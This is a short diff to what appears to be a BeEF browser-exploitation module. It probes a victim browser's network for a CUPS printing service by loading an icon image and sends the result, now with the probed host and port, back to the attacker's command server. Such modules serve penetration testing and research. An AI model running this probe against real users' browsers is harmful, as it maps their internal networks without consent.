@@ -9,14 +9,14 @@ beef.execute(function() {
 	var result = "Not Installed";
 	var dom = document.createElement('b');
 	var img = new Image;
-	img.src = "http://127.0.0.1:631/images/cups-icon.png";
+	img.src = "http://<%= @ipHost %>:<%= @port %>/images/cups-icon.png";
 	img.onload = function() {
 		if (this.width == 128 && this.height == 128) result="Installed";
-		beef.net.send('<%= @command_url %>', <%= @command_id %>,'cups='+result);
+		beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto=http&ip=<%= @ipHost %>&port=<%= @port %>&cups='+result);
 		dom.removeChild(this);
 	}
 	img.onerror = function() {
-		beef.net.send('<%= @command_url %>', <%= @command_id %>,'cups='+result);
+		beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto=http&ip=<%= @ipHost %>&port=<%= @port %>&cups='+result);
 		dom.removeChild(this);
 	}
 	dom.appendChild(img);
